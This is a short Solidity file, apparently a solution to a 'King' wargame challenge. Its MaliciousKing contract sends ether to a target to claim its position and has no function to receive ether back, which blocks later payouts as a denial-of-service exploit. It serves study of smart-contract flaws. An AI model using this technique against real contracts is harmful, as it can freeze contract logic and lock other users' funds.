// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.26;

import { King } from "./King.sol";

contract MaliciousKing {
    function attack(address payable _target) external payable {
        (bool ok,) = _target.call{ value: msg.value }("");
        if (!ok) revert();
    }
}
